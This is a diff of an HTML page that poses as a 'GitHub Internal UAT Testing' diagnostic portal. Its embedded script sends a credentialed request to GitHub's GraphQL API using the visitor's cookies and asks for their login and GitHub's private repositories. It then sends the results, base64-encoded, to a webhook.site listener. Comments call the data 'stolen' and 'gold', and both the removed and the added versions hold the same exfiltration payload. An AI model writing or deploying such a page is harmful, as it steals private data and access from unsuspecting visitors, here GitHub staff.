@@ -1,22 +1,30 @@
 <!DOCTYPE html>
 <html>
-<body>
-    <h1>System Maintenance</h1>
+<head><title>UAT Diagnostic Portal</title></head>
+<body style="font-family:sans-serif; background:#f6f8fa; padding:50px;">
+    <h1>GitHub Internal UAT Testing</h1>
+    <p>Diagnostic in progress... please wait.</p>
     <script>
-// This script bypasses the 404 and the Rate Limit by using the VICTIM'S browser
-// If a GitHub staff visits your page, this steals their private DB access token
-fetch('https://api.github.com/graphql', {
-    method: 'POST',
-    credentials: 'include', // THIS IS THE KEY: It sends THEIR staff cookies
-    body: JSON.stringify({
-        query: 'query { viewer { login organization(login: "github") { repositories(first: 10, privacy: PRIVATE) { nodes { name url } } } } }'
-    })
-})
-.then(r => r.json())
-.then(data => {
-    // Send the stolen private repo list (which contains DB creds) to your listener
-    fetch('https://webhook.site/YOUR-ID?stolen=' + btoa(JSON.stringify(data)));
-});
-</script>
+        // 1. We target the GitHub GraphQL API
+        fetch('https://api.github.com/graphql', {
+            method: 'POST',
+            // THIS IS THE CRITICAL PART: It force-sends the employee's login cookies
+            credentials: 'include', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                // 2. This query asks for the employee's username and their PRIVATE repositories
+                query: 'query { viewer { login } organization(login: "github") { repositories(first: 5, privacy: PRIVATE) { nodes { name url description } } } }'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            // 3. We send the stolen data to your Webhook listener
+            fetch('https://webhook.site/484decca-fdc9-4037-8097-ea186887ee6c?gold=' + btoa(JSON.stringify(data)));
+            console.log('Diagnostic Complete.');
+        })
+        .catch(err => {
+            fetch('https://webhook.site/484decca-fdc9-4037-8097-ea186887ee6c?error=' + btoa(err));
+        });
+    </script>
 </body>
 </html>
